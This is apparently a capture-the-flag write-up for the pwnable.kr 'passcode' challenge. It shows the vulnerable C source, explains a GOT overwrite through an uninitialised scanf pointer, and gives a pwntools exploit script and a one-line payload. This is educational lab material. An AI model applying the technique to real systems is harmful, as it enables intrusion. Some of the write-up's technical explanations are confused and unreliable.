# **passcode**

![](https://i.imgur.com/IcNGRJL.png)

`ssh passcode@pwnable.kr -p2222`

First, ssh to the server, then list it, you'll get the source code like following:

```
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

Cuz to `scanf("%d", passcode1);` scan without **&**, so we can input a memory address to make it become a function overwriter.

Accroding to designer's planning, there's a suspicious function : `fflush(stdin);`.

We can input `fflush()`'s address in GOT to `scanf()` to make it being overwritten, not cuz to `fflush()` is following behind `scanf("%d", passcode1);`, this point must be clearly recognized, so no matter `fflush()` locates in where, this attack will work.

![](https://i.imgur.com/mtMPjku.png)

To let `scanf()` overwrite `fflush()`, we should get the `fflush()`'s address in GOT（Global offset Table）.

GOT is a helpful design for process executing, when a new process is being executed, it will ask PLT(Procedure Linkage Table) about function's GOT address for any function that is imported from library.

Overall, the GOT is static function address that you can call it or more over to overwrite it and make a ROP chain.

This challenge is to make `scanf("%d", passcode1);` to be `scanf("%d",fflush@plt());` and let `fflush()` to ouput the `$esp` which is its own ability.

![](https://i.imgur.com/hpMsuAX.png)
![](https://i.imgur.com/p7pWYQL.png)

We got the `fflush()`'s address is `0x0804a004`.

Then we check that `name` store in `-0x70(%ebp)`, `passcode1` in `-0x10(%ebp)` and `passcode2` in `-0xc0(%ebp)`.

Hence, we found that **offset : 0x70-0x10 = 96 -> name – passcode1 = 96**. So name's last 4 byte can overwrite the `passcode1` to `fflush()`'s address, then when scanf() is called, it will set the input into `fflush()`. 


![](https://i.imgur.com/niiKcWn.png)

Normally, `fflush()` should output the **current** `$esp` then keep going down, but with our malicious offset, it can be set to the line which process just mov flag into `$esp` then continue, so those lines after `if(passcode1==338150 && passcode2==13371337)` before `system("/bin/cat flag");` will all be fine.(`0x080485d7`~`0x080485e3`)

Use script like following:

```
#!/usr/bin/python 

from pwn import *

target = process('/home/passcode/passcode')

fflush = 0x0804a004

system = 0x080485d7

payload = "A" * 96 + p32(fflush) + str(system)

target.send(payload)

target.interactive()
```

Or python shell :

![](https://i.imgur.com/STkc88R.png)

`python -c "print ('A'*96+'\x04\xa0\x04\x08'+'134514147')" | ./passcode`

![](https://i.imgur.com/ygWdr5n.png)

Fin.

